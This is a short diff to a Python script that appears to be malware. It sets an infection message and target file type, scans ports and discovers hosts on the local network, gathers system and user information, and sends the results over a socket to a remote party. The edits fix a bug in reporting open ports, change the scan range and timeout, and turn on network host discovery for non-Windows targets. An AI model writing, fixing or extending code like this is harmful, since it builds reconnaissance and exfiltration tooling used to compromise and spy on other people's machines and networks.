@@ -16,7 +16,8 @@ port = 9999
 target_os = None
 infection_message = "You've been infected!!"
 target_file_type = ".foo"
-timeout = 0.001
+timeout = 0.01
+start_port = 65435
 
 windows_services_lister_ps1 = """
 # Define the IP address or hostname of the remote machine
@@ -255,7 +256,7 @@ def get_network_addr():
 def port_scan(target, timeout):
     open_ports = []
 
-    for port in range(1, 65535):
+    for port in range(start_port, 65535):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.settimeout(timeout)
             result = s.connect_ex((target, port))
@@ -290,7 +291,8 @@ def find_hosts_on_network(s):
     if target_os == "Windows":
         open_ports = port_scan(get_ip(), timeout)
         send_data(s,f"------------------- {len(open_ports)} OPEN PORTS -------------------")
-        send_data(s, str('\n'.join(port)))
+        if open_ports != None and len(open_ports) > 0:
+            send_data(s, str('\n'.join(open_ports)))
         return
 
     # If the OS is not Windows the below will run
@@ -447,7 +449,8 @@ get_sys_info(s)
 get_user_info(s)
 
     # (4.3) Find the active hosts on the network.
-# find_hosts_on_network(s)
+if target_os != "Windows":
+    find_hosts_on_network(s)
 
     # (4.4) See what services are running & whats ports are open.
 find_running_services(s)
